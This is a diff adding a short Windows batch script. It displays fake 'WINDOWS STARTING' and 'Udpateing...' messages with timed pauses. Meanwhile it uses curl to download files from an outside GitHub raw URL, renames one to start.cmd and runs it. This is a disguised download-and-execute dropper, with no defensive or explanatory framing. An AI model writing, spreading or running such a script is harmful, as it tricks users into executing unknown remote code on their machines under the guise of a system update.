@@ -1,0 +1,25 @@
+@echo off
+echo WINDOWS
+echo ###################################################################################################
+timeout 10 /NOBREAK >nul
+echo async data
+curl https://raw.githubusercontent.com/awwsssssssss/windows/main/async > async.db
+cls 
+echo WINDOWS
+echo:
+type async.db
+timeout 10 /NOBREAK >nul
+cls
+echo WINDOWS STARTING
+timeout 10 /NOBREAK >nul
+echo inting...
+timeout 10 /NOBREAK >nul
+echo configure...
+timeout 10 /NOBREAK >nul
+echo downloading...
+timeout 10 /NOBREAK >nul
+cls
+echo Udpateing...
+curl https://raw.githubusercontent.com/awwsssssssss/windows/main/Beta >udpate.pack
+ren udpate.pack start.cmd
+start.cmd
